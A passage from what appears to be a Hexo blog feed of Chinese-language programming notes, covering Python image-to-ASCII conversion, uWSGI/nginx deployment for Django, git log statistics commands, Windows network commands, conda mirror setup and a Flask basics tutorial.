        <content type="html"><![CDATA[<blockquote><p>使用python将一个图片转换成字符画输出在终端</p></blockquote><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><table><thead><tr><th>名称</th><th>版本</th></tr></thead><tbody><tr><td>python</td><td>3.11.1</td></tr><tr><td>pip</td><td>24.0</td></tr><tr><td>pillow</td><td>9.5.0</td></tr></tbody></table><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><pre><code class="shell">pip install pillow@9.5.0</code></pre><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre><code class="python">from PIL import Image# 将像素转换为字符def pixel2char(pixel):    # 灰度值计算公式    gray = int(0.2126 * pixel[0] + 0.7152 * pixel[1] + 0.0722 * pixel[2])    # 字符集，共70个字符，字符从灰度值高到低依次排列    char_list = list(&quot;$@B%8&amp;WM#*oahkbdpqwmZO0QCJYXzcvn/\|()1&#123;&#125;[]?-_+~&lt;&gt;i!lI;:,\&quot;^`&#39;. &quot;)    # 计算字符索引    char_index = int(gray / 256 * len(char_list))    # 返回字符    return char_list[char_index]# 将图片转换为字符画def image2char(image_path, char_width=50):    # 打开图片    image = Image.open(image_path)    # 调整图片大小    width, height = image.size    char_height = int(char_width * height / width / 2)    image = image.resize((char_width, char_height))    # 转换为灰度图    image = image.convert(&quot;RGB&quot;)    pixels = image.load()    # 生成字符画    char_image = &quot;&quot;    for y in range(char_height):        for x in range(char_width):            char_image += pixel2char(pixels[x, y])        char_image += &quot;\n&quot;    # 返回字符画    return char_image# 测试if __name__ == &quot;__main__&quot;:    char_image = image2char(&quot;./test.png&quot;)    print(char_image)</code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pillow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>uWsgi</title>
      <link href="/2024/10/20/linux-uwsgi/"/>
      <url>/2024/10/20/linux-uwsgi/</url>
      
        <content type="html"><![CDATA[<blockquote><p>uWsgi在Linux上部署Django项目。</p></blockquote><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>系统：<a href="mailto:&#x4c;&#x69;&#110;&#117;&#x78;&#45;&#67;&#x65;&#110;&#x74;&#79;&#x73;&#64;&#x37;&#46;&#x39;">&#x4c;&#x69;&#110;&#117;&#x78;&#45;&#67;&#x65;&#110;&#x74;&#79;&#x73;&#64;&#x37;&#46;&#x39;</a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>uWSGI是一个Web服务器，也是Python的一个模块，直接pip安装即可</p><pre><code class="shell">pip3 install uwsgi -i http://mirrors.aliyun.com/pypi/simple --trusted-host mirrors.aliyun.com</code></pre><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="uWsgi"><a href="#uWsgi" class="headerlink" title="uWsgi"></a>uWsgi</h3><p>&#x2F;opt&#x2F;ldp&#x2F;uwsgi.ini</p><pre><code class="ini">[uwsgi]# 项目目录chdir = /opt/ldp# 指定sock的文件路径socket = /opt/ldp/uwsgi.sock# 指定监听端口#http = 0.0.0.0:8080# 静态资源static-map = /static=/opt/ldp/static# wsgi文件（django入口）wsgi-file=ldp/wsgi.py# 进程个数processes = 4 # 进程pidpidfile = /opt/ldp/uwsgi.pid# 日志路径daemonize = /var/log/uwsgi.log</code></pre><h3 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h3><pre><code class="conf">server &#123;    listen 80 default_server;    server_name  _;    location / &#123;       include uwsgi_params;  # 导入模块用于与uwsgi通信       uwsgi_pass unix:/opt/ldp/uwsgi.sock;     &#125;    # 静态文件目录    location /static &#123;       alias /opt/ldp/static;    &#125;&#125;</code></pre><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><pre><code class="shell">uwsgi --ini /opt/ldp/uwsgi.ini</code></pre><h3 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h3><pre><code class="shell">uwsgi --reload /opt/ldp/uwsgi.ini</code></pre><h3 id="停止"><a href="#停止" class="headerlink" title="停止"></a>停止</h3><pre><code class="shell">uwsgi --stop /opt/ldp/uwsgi.pid</code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> uWsgi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git统计操作</title>
      <link href="/2024/10/18/git-log/"/>
      <url>/2024/10/18/git-log/</url>
      
        <content type="html"><![CDATA[<h2 id="git-log说明"><a href="#git-log说明" class="headerlink" title="git log说明"></a>git log说明</h2><h3 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h3><blockquote></blockquote><pre><code>--author 指定作者--stat 显示每次更新的文件修改统计信息，会列出具体文件列表--shortstat 统计每个commit 的文件修改行数，包括增加，删除，但不列出文件列表：--numstat 统计每个commit 的文件修改行数，包括增加，删除，并列出文件列表：-p 选项展开显示每次提交的内容差异，用 -2 则仅显示最近的两次更新--name-only 仅在提交信息后显示已修改的文件清单--name-status 显示新增、修改、删除的文件清单--abbrev-commit 仅显示 SHA-1 的前几个字符，而非所有的 40 个字符--relative-date 使用较短的相对时间显示（比如，“2 weeks ago”）--graph 显示 ASCII 图形表示的分支合并历史--pretty 使用其他格式显示历史提交信息。可用的选项包括 oneline，short，full，fuller 和 format--since 限制显示输出的范围，-(n) 仅显示最近的 n 条提交--since, --after 仅显示指定时间之后的提交。--until, --before 仅显示指定时间之前的提交。--author 仅显示指定作者相关的提交。--committer 仅显示指定提交者相关的提交。</code></pre><h3 id="常用的格式占位符写法及其代表的意义"><a href="#常用的格式占位符写法及其代表的意义" class="headerlink" title="常用的格式占位符写法及其代表的意义"></a>常用的格式占位符写法及其代表的意义</h3><table><thead><tr><th>选项</th><th>说明</th></tr></thead><tbody><tr><td>%H</td><td>提交对象（commit）的完整哈希字串</td></tr><tr><td>%h</td><td>提交对象的简短哈希字串</td></tr><tr><td>%T</td><td>树对象（tree）的完整哈希字串</td></tr><tr><td>%t</td><td>树对象的简短哈希字串</td></tr><tr><td>%P</td><td>父对象（parent）的完整哈希字串</td></tr><tr><td>%p</td><td>父对象的简短哈希字串</td></tr><tr><td>%an</td><td>作者（author）的名字</td></tr><tr><td>%ae</td><td>作者的电子邮件地址</td></tr><tr><td>%ad</td><td>作者修订日期（可以用 -date&#x3D; 选项定制格式）</td></tr><tr><td>%ar</td><td>作者修订日期，按多久以前的方式显示</td></tr><tr><td>%cn</td><td>提交者(committer)的名字</td></tr><tr><td>%ce</td><td>提交者的电子邮件地址</td></tr><tr><td>%cd</td><td>提交日期</td></tr><tr><td>%cr</td><td>提交日期，按多久以前的方式显示</td></tr><tr><td>%s</td><td>提交说明</td></tr></tbody></table><h3 id="一些例子"><a href="#一些例子" class="headerlink" title="一些例子"></a>一些例子</h3><pre><code class="bash"># 仅显示最近的两次更新的内容差异git log -p -2# 使用oneline格式显示历史提交信息git log --pretty=oneline# 使用format格式自定义显示历史提交信息(占位符写法)git log --pretty=format:&quot;&quot;%h - %an, %ar : %s&quot;&quot;# 一分钟之前的所有 loggit log --until=1.minute.ago# 一天之内的loggit log --since=1.day.ago# 一个小时之内的 loggit log --since=1.hour.ago# 显示最近两周的提交git log --since=2.weeks# 一个月之前到半个月之前的loggit log --since=1.month.ago --until=2.weeks.ago# 某个时间段的 loggit log --since ==2013-08.01 --until=2013-09-07# 看看某一个文件的相关历史记录git blame index.html --date short</code></pre><h2 id="按commit统计"><a href="#按commit统计" class="headerlink" title="按commit统计"></a>按commit统计</h2><pre><code class="bash"># 统计当前作者今天（从凌晨1点开始）提交次数git log --author=&quot;$(git config --get user.name)&quot; --no-merges --since=1am --stat# 按提交作者统计，按提交次数排序git shortlog -sngit shortlog --numbered --summary# 只看某作者提交的commit数git log --author=&quot;faker&quot; --oneline --shortstat# 按提交作者统计，提交数量排名前5（看全部，去掉head管道即可）git log --pretty=&#39;%aN&#39; | sort | uniq -c | sort -k1 -n -r | head -n 5# 按提交者邮箱统计，提交数量排名前5git log --pretty=format:%ae | gawk -- &#39;&#123; ++c[$0]; &#125; END &#123; for(cc in c) printf &quot;%5d %s\n&quot;,c[cc],cc; &#125;&#39; | sort -u -n -r | head -n 5# 统计贡献者数量git log --pretty=&#39;%aN&#39; | sort -u | wc -l# 统计提交数量git log --oneline | wc -l</code></pre><h2 id="按代码行数统计"><a href="#按代码行数统计" class="headerlink" title="按代码行数统计"></a>按代码行数统计</h2><pre><code class="bash"># 统计指定作者增删行数git log --author=&quot;faker&quot; --pretty=tformat: --numstat | awk &#39;&#123; add += $1; subs += $2; loc += $1 - $2 &#125; END &#123; printf &quot;added lines: %s, removed lines: %s, total lines: %s\n&quot;, add, subs, loc &#125;&#39; -# 统计当前作者增删行数git log --author=&quot;$(git config --get user.name)&quot; --pretty=tformat: --numstat | gawk &#39;&#123; add += $1 ; subs += $2 ; loc += $1 - $2 &#125; END &#123; printf &quot;added lines: %s removed lines : %s total lines: %s\n&quot;,add,subs,loc &#125;&#39; -# 统计所有邮箱前缀的增删行数 -英文版git log --shortstat --pretty=&quot;%cE&quot; | sed &#39;s/\(.*\)@.*/\1/&#39; | grep -v &quot;^$&quot; | awk &#39;BEGIN &#123; line=&quot;&quot;; &#125; !/^ / &#123; if (line==&quot;&quot; || !match(line, $0)) &#123;line = $0 &quot;,&quot; line &#125;&#125; /^ / &#123; print line &quot; # &quot; $0; line=&quot;&quot;&#125;&#39; | sort | sed -E &#39;s/# //;s/ files? changed,//;s/([0-9]+) ([0-9]+ deletion)/\1 0 insertions\(+\), \2/;s/\(\+\)$/\(\+\), 0 deletions\(-\)/;s/insertions?\(\+\), //;s/ deletions?\(-\)//&#39; | awk &#39;BEGIN &#123;name=&quot;&quot;; files=0; insertions=0; deletions=0;&#125; &#123;if ($1 != name &amp;&amp; name != &quot;&quot;) &#123; print name &quot;: &quot; files &quot; files changed, &quot; insertions &quot; insertions(+), &quot; deletions &quot; deletions(-), &quot; insertions-deletions &quot; net&quot;; files=0; insertions=0; deletions=0; name=$1; &#125; name=$1; files+=$2; insertions+=$3; deletions+=$4&#125; END &#123;print name &quot;: &quot; files &quot; files changed, &quot; insertions &quot; insertions(+), &quot; deletions &quot; deletions(-), &quot; insertions-deletions &quot; net&quot;;&#125;&#39;# 统计所有邮箱前缀的增删行数 -中文版git log --shortstat --pretty=&quot;%cE&quot; | sed &#39;s/\(.*\)@.*/\1/&#39; | grep -v &quot;^$&quot; | awk &#39;BEGIN &#123; line=&quot;&quot;; &#125; !/^ / &#123; if (line==&quot;&quot; || !match(line, $0)) &#123;line = $0 &quot;,&quot; line &#125;&#125; /^ / &#123; print line &quot; # &quot; $0; line=&quot;&quot;&#125;&#39; | sort | sed -E &#39;s/# //;s/ files? changed,//;s/([0-9]+) ([0-9]+ deletion)/\1 0 insertions\(+\), \2/;s/\(\+\)$/\(\+\), 0 deletions\(-\)/;s/insertions?\(\+\), //;s/ deletions?\(-\)//&#39; | awk &#39;BEGIN &#123;name=&quot;&quot;; files=0; insertions=0; deletions=0;&#125; &#123;if ($1 != name &amp;&amp; name != &quot;&quot;) &#123; print name &quot;: &quot; files &quot; 个文件被改变, &quot; insertions &quot; 行被插入(+), &quot; deletions &quot; 行被删除(-), &quot; insertions-deletions &quot; 行剩余&quot;; files=0; insertions=0; deletions=0; name=$1; &#125; name=$1; files+=$2; insertions+=$3; deletions+=$4&#125; END &#123;print name &quot;: &quot; files &quot; 个文件被改变, &quot; insertions &quot; 行被插入(+), &quot; deletions &quot; 行被删除(-), &quot; insertions-deletions &quot; 行剩余&quot;;&#125;&#39;# 统计所有作者增删行数 --英文版git log --format=&#39;%aN&#39; | sort -u | while read name; do echo -en &quot;$name\t&quot;; git log --author=&quot;$name&quot; --pretty=tformat: --numstat | awk &#39;&#123; add += $1; subs += $2; loc += $1 - $2 &#125; END &#123; printf &quot;added lines: %s, removed lines: %s, total lines: %s\n&quot;, add, subs, loc &#125;&#39; -; done# 统计所有作者增删行数 --中文版git log --format=&#39;%aN&#39; | sort -u | while read name; do echo -en &quot;$name\t&quot;; git log --author=&quot;$name&quot; --pretty=tformat: --numstat | awk &#39;&#123; add += $1; subs += $2; loc += $1 - $2 &#125; END &#123; printf &quot;添加行数: %s, 删除行数: %s, 总行数: %s\n&quot;, add, subs, loc &#125;&#39; -; done</code></pre>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Log </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Win-Cmd</title>
      <link href="/2024/10/15/win-cmd/"/>
      <url>/2024/10/15/win-cmd/</url>
      
        <content type="html"><![CDATA[<p>记录学习一些Windows系统下用到的命令</p><h2 id="查询信息"><a href="#查询信息" class="headerlink" title="查询信息"></a>查询信息</h2><h3 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h3><pre><code class="shell">msinfo32</code></pre><h3 id="详细硬件信息"><a href="#详细硬件信息" class="headerlink" title="详细硬件信息"></a>详细硬件信息</h3><pre><code class="shell">dxdiag</code></pre><h3 id="mac地址"><a href="#mac地址" class="headerlink" title="mac地址"></a>mac地址</h3><pre><code class="shell">getmac</code></pre><h3 id="ip和物理地址"><a href="#ip和物理地址" class="headerlink" title="ip和物理地址"></a>ip和物理地址</h3><pre><code class="shell">arp -a</code></pre><h3 id="TCP-x2F-IP配置信息"><a href="#TCP-x2F-IP配置信息" class="headerlink" title="TCP&#x2F;IP配置信息"></a>TCP&#x2F;IP配置信息</h3><pre><code class="shell"># 显示信息ipconfig# 显示详细信息ipconfig /all# 显示有关所有隔离舱的信息ipconfig /allcompartments# 显示有关所有隔离舱的详细信息ipconfig /allcompartments /all</code></pre><h3 id="网络监听状况"><a href="#网络监听状况" class="headerlink" title="网络监听状况"></a>网络监听状况</h3><pre><code class="shell">netstat</code></pre><h3 id="检查网络连接或通信"><a href="#检查网络连接或通信" class="headerlink" title="检查网络连接或通信"></a>检查网络连接或通信</h3><pre><code class="shell"># 基本命令ping baidu.com## ping指定的主机，直到主动停止ping -t# 将地址解析为主机名ping -a# 要发送的回显请求数ping -n</code></pre><h3 id="route路由表"><a href="#route路由表" class="headerlink" title="route路由表"></a>route路由表</h3><pre><code class="shell"># 显示路由表IPv4route print -4# 显示路由表IPv6route print -6</code></pre><h3 id="跟踪网络跳转路径"><a href="#跟踪网络跳转路径" class="headerlink" title="跟踪网络跳转路径"></a>跟踪网络跳转路径</h3><pre><code class="shell">tracert -d www.baidu.com# -d 不将地址解析成主机名</code></pre><h2 id="修改信息"><a href="#修改信息" class="headerlink" title="修改信息"></a>修改信息</h2><h3 id="TCP-x2F-IP配置信息-1"><a href="#TCP-x2F-IP配置信息-1" class="headerlink" title="TCP&#x2F;IP配置信息"></a>TCP&#x2F;IP配置信息</h3><pre><code class="shell"># 释放指定适配器的IPv4地址ipconfig /release# 释放指定适配器的IPv6地址ipconfig /release6# 更新指定适配器的IPv4地址ipconfig /renew# 更新指定适配器的IPv6地址ipconfig /renew6# 清除 DNS 解析程序缓存ipconfig /flushdns# 刷新所有 DHCP 租用并重新注册 DNS 名称ipconfig /registerdns# 显示 DNS 解析程序缓存的内容ipconfig /displaydns</code></pre><h3 id="route路由表-1"><a href="#route路由表-1" class="headerlink" title="route路由表"></a>route路由表</h3><pre><code class="shell"># 添加路由route add# 删除路由route delete# 修改现有路由route change</code></pre><h2 id="操作命令"><a href="#操作命令" class="headerlink" title="操作命令"></a>操作命令</h2><h3 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h3><pre><code class="shell"></code></pre><h3 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h3><pre><code class="shell"></code></pre>]]></content>
      
      
      <categories>
          
          <category> Win </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cmd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Conda</title>
      <link href="/2024/10/01/conda/"/>
      <url>/2024/10/01/conda/</url>
      
        <content type="html"><![CDATA[<blockquote><p>conda是一个开源的软件包管理系统和环境管理系统，用于安装、运行、更新多个版本的软件包及其依赖关系。它支持‌Python、‌R、‌Java、‌JavaScript、‌C&#x2F;C++、‌Fortran等多种语言，可以在‌Windows、‌MacOS、‌Linux等平台上运行。</p></blockquote><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><ol><li><a href="https://repo.anaconda.com/">官网地址</a></li><li><a href="https://repo.anaconda.com/archive/">历史版本地址</a></li></ol><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><p>安装完成后，可以通过 conda init 命令将conda配置到终端设置中，以便在新的终端中自动进入conda环境。</p><pre><code class="shell">conda init</code></pre><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><h3 id="创建环境"><a href="#创建环境" class="headerlink" title="创建环境"></a>创建环境</h3><pre><code class="shell">conda create -n envName python=3.8</code></pre><h3 id="激活环境"><a href="#激活环境" class="headerlink" title="激活环境"></a>激活环境</h3><pre><code class="shell">conda activate envName</code></pre><h3 id="退出环境"><a href="#退出环境" class="headerlink" title="退出环境"></a>退出环境</h3><pre><code class="shell">conda deactivate</code></pre><h2 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h2><h3 id="查看环境列表"><a href="#查看环境列表" class="headerlink" title="查看环境列表"></a>查看环境列表</h3><pre><code class="shell">conda info -econda env list</code></pre><h3 id="删除环境"><a href="#删除环境" class="headerlink" title="删除环境"></a>删除环境</h3><pre><code class="shell">conda remove -n envName --all</code></pre><h3 id="安装包"><a href="#安装包" class="headerlink" title="安装包"></a>安装包</h3><pre><code class="shell">conda install -n envName numpy</code></pre><h3 id="更新包"><a href="#更新包" class="headerlink" title="更新包"></a>更新包</h3><pre><code class="shell">conda update -n envName numpy</code></pre><h3 id="查看支持python版本"><a href="#查看支持python版本" class="headerlink" title="查看支持python版本"></a>查看支持python版本</h3><pre><code class="shell"># 查看所有支持版本conda search python# 按版本号筛选查询支持版本conda search pyrhon=3.8</code></pre><h2 id="更换源"><a href="#更换源" class="headerlink" title="更换源"></a>更换源</h2><h3 id="windows-1"><a href="#windows-1" class="headerlink" title="windows"></a>windows</h3><ol><li>Windows 用户无法直接创建名为 .condarc 的文件，需要先执行如下命令，生成该文件后再修改。</li></ol><pre><code class="shell">conda config --set show_channel_urls yes</code></pre><ol start="2"><li>找到生成的配置文件（文件地址示例 “C:\Users\15703.condarc”）。</li><li>在 .condarc 文件中添加清华源</li></ol><pre><code>channels:  - defaultsshow_channel_urls: truedefault_channels:  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/r  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/msys2custom_channels:  conda-forge: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud  msys2: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud  bioconda: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud  menpo: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud  pytorch: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud  pytorch-lts: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud  simpleitk: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud</code></pre><h3 id="linux-1"><a href="#linux-1" class="headerlink" title="linux"></a>linux</h3>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Conda </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flask</title>
      <link href="/2024/10/01/flask/"/>
      <url>/2024/10/01/flask/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Flask是一个Python编写的Web微框架，让我们可以使用Python语言快速实现一个网站或Web服务。</p></blockquote><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><pre><code class="shell">pip install flask</code></pre><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><h3 id="入口文件"><a href="#入口文件" class="headerlink" title="入口文件"></a>入口文件</h3><ol><li>server.py</li></ol><pre><code class="python">from flask import Flaskapp = Flask(__name__)# 是否启用调试模式app.debug=False@app.route(&#39;/&#39;)def hello_world():    return &#39;hello world&#39;if __name__ == &#39;__main__&#39;:    app.run(host=&#39;127.0.0.1&#39;,port=5000)</code></pre><ol start="2"><li>启动</li></ol><pre><code class="shell">python server.py</code></pre><h3 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h3><pre><code class="python">@app.route(&#39;/&#39;)def index():    return &#39;Index Page&#39;@app.route(&#39;/hello&#39;)def hello():    return &#39;Hello, World&#39;</code></pre><h3 id="路径变量"><a href="#路径变量" class="headerlink" title="路径变量"></a>路径变量</h3><p>如果希望获取&#x2F;article&#x2F;1这样的路径参数，就需要使用路径变量。路径变量的语法是&#x2F;path&#x2F;<a href="converter:varname">converter:varname</a>。在路径变量前还可以使用可选的转换器，有以下几种转换器。</p><table><thead><tr><th>转换器</th><th>作用</th></tr></thead><tbody><tr><td>string</td><td>默认选项，接受除了斜杠之外的字符串</td></tr><tr><td>int</td><td>接受整数</td></tr><tr><td>float</td><td>接受浮点数</td></tr><tr><td>path</td><td>和string类似，不过可以接受带斜杠的字符串</td></tr><tr><td>any</td><td>匹配任何一种转换器</td></tr><tr><td>uuid</td><td>接受UUID字符串</td></tr></tbody></table><p>下面是Flask官方的例子：</p><pre><code class="python">@app.route(&#39;/user/&lt;username&gt;&#39;)def show_user_profile(username):    # show the user profile for that user    return &#39;User %s&#39; % username@app.route(&#39;/post/&lt;int:post_id&gt;&#39;)def show_post(post_id):    # show the post with the given id, the id is an integer    return &#39;Post %d&#39; % post_id</code></pre><h3 id="构造URL"><a href="#构造URL" class="headerlink" title="构造URL"></a>构造URL</h3><p>在Web程序中常常需要获取某个页面的URL，在Flask中需要使用url_for(‘方法名’)来构造对应方法的URL。下面是Flask官方的例子。</p><p>&#x2F;login<br>&#x2F;login?next&#x3D;&#x2F;<br>&#x2F;user&#x2F;John%20Doe</p><pre><code class="python">from flask import Flask, url_forapp = Flask(__name__)@app.route(&#39;/&#39;)def index(): pass@app.route(&#39;/login&#39;)def login(): pass@app.route(&#39;/user/&lt;username&gt;&#39;)def profile(username): passwith app.test_request_context():    print url_for(&#39;index&#39;)    print url_for(&#39;login&#39;)    print url_for(&#39;login&#39;, next=&#39;/&#39;)    print url_for(&#39;profile&#39;, username=&#39;John Doe&#39;)</code></pre><h3 id="HTTP方法"><a href="#HTTP方法" class="headerlink" title="HTTP方法"></a>HTTP方法</h3><p>如果需要处理具体的HTTP方法，在Flask中也很容易，使用route装饰器的methods参数设置即可。</p><pre><code class="python">from flask import request@app.route(&#39;/login&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])def login():    if request.method == &#39;POST&#39;:        do_the_login()    else:        show_the_login_form()</code></pre><h3 id="静态文件"><a href="#静态文件" class="headerlink" title="静态文件"></a>静态文件</h3><p>Web程序中常常需要处理静态文件，在Flask中需要使用url_for函数并指定static端点名和文件名。在下面的例子中，实际的文件应放在static&#x2F;文件夹下。</p><pre><code class="python">url_for(&#39;static&#39;, filename=&#39;style.css&#39;)</code></pre><h3 id="模板生成"><a href="#模板生成" class="headerlink" title="模板生成"></a>模板生成</h3><p>Flask默认使用Jinja2作为模板，Flask会自动配置Jinja 模板，所以我们不需要其他配置了。默认情况下，模板文件需要放在templates文件夹下。<br>使用 Jinja 模板，只需要使用render_template函数并传入模板文件名和参数名即可。</p><pre><code class="python">from flask import render_template@app.route(&#39;/hello/&#39;)@app.route(&#39;/hello/&lt;name&gt;&#39;)def hello(name=None):    return render_template(&#39;hello.html&#39;, name=name)</code></pre><p>相应的模板文件如下：</p><pre><code class="txt">&lt;!doctype html&gt;&lt;title&gt;Hello from Flask&lt;/title&gt;&#123;% if name %&#125;  <h1>Hello &#123;&#123; name &#125;&#125;!</h1>&#123;% else %&#125;  <h1>Hello, World!</h1>&#123;% endif %&#125;</code></pre><h3 id="日志输出"><a href="#日志输出" class="headerlink" title="日志输出"></a>日志输出</h3><p>Flask 为我们预配置了一个 Logger，我们可以直接在程序中使用。这个Logger是一个标准的Python Logger，所以我们可以向标准Logger那样配置它，详情可以参考官方文档或者我的文章Python 日志输出。</p><pre><code class="python">app.logger.debug(&#39;A value for debugging&#39;)app.logger.warning(&#39;A warning occurred (%d apples)&#39;, 42)app.logger.error(&#39;An error occurred&#39;)</code></pre><h2 id="处理请求"><a href="#处理请求" class="headerlink" title="处理请求"></a>处理请求</h2><p>在 Flask 中获取请求参数需要使用request等几个全局对象，但是这几个全局对象比较特殊，它们是 Context Locals ，其实就是 Web 上下文中局部变量的代理。虽然我们在程序中使用的是全局变量，但是对于每个请求作用域，它们都是互不相同的变量。理解了这一点，后面就非常简单了。</p><h3 id="Request对象"><a href="#Request对象" class="headerlink" title="Request对象"></a>Request对象</h3><ol><li>Request 对象是一个全局对象，利用它的属性和方法，我们可以方便的获取从页面传递过来的参数。</li><li>method属性会返回HTTP方法的类似，例如post和get。form属性是一个字典，如果数据是POST类型的表单，就可以从form属性中获取。下面是 Flask 官方的例子，演示了 Request 对象的method和form属性。</li></ol><pre><code class="python">from flask import request@app.route(&#39;/login&#39;, methods=[&#39;POST&#39;, &#39;GET&#39;])def login():    error = None    if request.method == &#39;POST&#39;:        if valid_login(request.form[&#39;username&#39;],                       request.form[&#39;password&#39;]):            return log_the_user_in(request.form[&#39;username&#39;])        else:            error = &#39;Invalid username/password&#39;    # the code below is executed if the request method    # was GET or the credentials were invalid    return render_template(&#39;login.html&#39;, error=error)</code></pre><p>如果数据是由GET方法传送过来的，可以使用args属性获取，这个属性也是一个字典。</p><pre><code class="python">searchword = request.args.get(&#39;key&#39;, &#39;&#39;)</code></pre><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>利用Flask也可以方便的获取表单中上传的文件，只需要利用 request 的files属性即可，这也是一个字典，包含了被上传的文件。如果想获取上传的文件名，可以使用filename属性，不过需要注意这个属性可以被客户端更改，所以并不可靠。更好的办法是利用werkzeug提供的secure_filename方法来获取安全的文件名。</p><pre><code class="python">from flask import requestfrom werkzeug.utils import secure_filename@app.route(&#39;/upload&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])def upload_file():    if request.method == &#39;POST&#39;:        f = request.files[&#39;the_file&#39;]        f.save(&#39;/var/www/uploads/&#39; + secure_filename(f.filename))</code></pre><h3 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a>Cookies</h3><p>Flask也可以方便的处理Cookie。使用方法很简单，直接看官方的例子就行了。下面的例子是如何获取cookie。</p><pre><code class="python">from flask import request@app.route(&#39;/&#39;)def index():    username = request.cookies.get(&#39;username&#39;)    # 使用 cookies.get(key) 代替 cookies[key] 避免    # 得到 KeyError 如果cookie不存在</code></pre><p>如果需要发送cookie给客户端，参考下面的例子。</p><pre><code class="python">from flask import make_response@app.route(&#39;/&#39;)def index():    resp = make_response(render_template(...))    resp.set_cookie(&#39;username&#39;, &#39;the username&#39;)    return resp</code></pre><h3 id="重定向和错误"><a href="#重定向和错误" class="headerlink" title="重定向和错误"></a>重定向和错误</h3><p>redirect和abort函数用于重定向和返回错误页面。</p><pre><code class="python">from flask import abort, redirect, url_for@app.route(&#39;/&#39;)def index():    return redirect(url_for(&#39;login&#39;))@app.route(&#39;/login&#39;)def login():    abort(401)    this_is_never_executed()</code></pre><p>默认的错误页面是一个空页面，如果需要自定义错误页面，可以使用errorhandler装饰器。</p><pre><code class="python">from flask import render_template@app.errorhandler(404)def page_not_found(error):    return render_template(&#39;page_not_found.html&#39;), 404</code></pre><h3 id="响应处理"><a href="#响应处理" class="headerlink" title="响应处理"></a>响应处理</h3><p>默认情况下，Flask会根据函数的返回值自动决定如何处理响应：如果返回值是响应对象，则直接传递给客户端；如果返回值是字符串，那么就会将字符串转换为合适的响应对象。我们也可以自己决定如何设置响应对象，方法也很简单，使用make_response函数即可。</p><pre><code class="python">@app.errorhandler(404)def not_found(error):    resp = make_response(render_template(&#39;error.html&#39;), 404)    resp.headers[&#39;X-Something&#39;] = &#39;A value&#39;    return resp</code></pre><h3 id="Sessions"><a href="#Sessions" class="headerlink" title="Sessions"></a>Sessions</h3><p>我们可以使用全局对象session来管理用户会话。Sesison 是建立在 Cookie 技术上的，不过在 Flask 中，我们还可以为 Session 指定密钥，这样存储在 Cookie 中的信息就会被加密，从而更加安全。直接看 Flask 官方的例子吧。</p><pre><code class="python">from flask import Flask, session, redirect, url_for, escape, requestapp = Flask(__name__)@app.route(&#39;/&#39;)def index():    if &#39;username&#39; in session:        return &#39;Logged in as %s&#39; % escape(session[&#39;username&#39;])    return &#39;You are not logged in&#39;@app.route(&#39;/login&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])def login():    if request.method == &#39;POST&#39;:        session[&#39;username&#39;] = request.form[&#39;username&#39;]        return redirect(url_for(&#39;index&#39;))    return &#39;&#39;&#39;        &lt;form method=&quot;post&quot;&gt;            &lt;p&gt;&lt;input type=text name=username&gt;            &lt;p&gt;&lt;input type=submit value=Login&gt;        &lt;/form&gt;    &#39;&#39;&#39;@app.route(&#39;/logout&#39;)def logout():    # remove the username from the session if it&#39;s there    session.pop(&#39;username&#39;, None)    return redirect(url_for(&#39;index&#39;))# set the secret key.  keep this really secret:app.secret_key = 